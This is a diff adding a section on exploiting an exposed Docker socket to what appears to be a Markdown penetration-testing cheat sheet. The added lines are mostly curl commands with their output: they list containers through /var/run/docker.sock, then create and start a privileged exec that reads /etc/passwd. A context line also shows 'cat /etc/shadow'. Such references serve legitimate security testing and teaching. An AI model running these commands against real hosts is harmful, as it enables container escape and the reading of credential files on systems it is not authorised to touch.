@@ -86,3 +86,30 @@ cat /etc/shadow
 ```bash
 docker save -o output.tar public.ecr.aws/xxx/yyy
 ```
+
+## Exploit docker.sock with curl
+
+From [https://dejandayoff.com/the-danger-of-exposing-docker.sock/](https://dejandayoff.com/the-danger-of-exposing-docker.sock/
+):
+
+```bash
+root@1nmyd0ck3r:~# ls -al /var/run/docker.sock
+srw-rw---- 1 root 998 0 May 29 15:07 /var/run/docker.sock
+
+root@1nmyd0ck3r:~# curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
+[
+    {
+        "Id": "9a79cbdfbc4d48982f1a427909bb6...",
+        # ...
+    },
+    {
+        "Id": "76b79677e3cc5db8764df08d75474...",
+        # ...
+    }
+]
+
+root@1nmyd0ck3r:~# curl -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' --unix-socket /var/run/docker.sock http://127.0.0.1/containers/9a79cbdfbc4d48982f1a427909bb6.../exec
+{"Id":"1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256"}
+
+root@1nmyd0ck3r:~# curl --output - -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' --unix-socket /var/run/docker.sock http://127.0.0.1/exec/1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256/start
+```
